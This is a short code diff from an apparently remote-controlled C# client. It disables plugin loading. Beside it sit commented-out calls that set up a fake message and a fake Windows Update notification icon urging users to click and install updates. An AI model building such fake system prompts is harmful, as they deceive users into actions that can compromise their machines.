@@ -46,7 +46,7 @@ namespace Client
                 HideOnStart = false
             });
             Handler.Instance.OnCommandEvent += Instance_OnCommandEvent;
-            LoadPlugins();
+            //LoadPlugins();
             //SetupFakeMsg();
             //CreateFakeWindowsUpdateNotifyIcon(1000,  "New updates are available", "Click to install them using Windows Update.");
         }
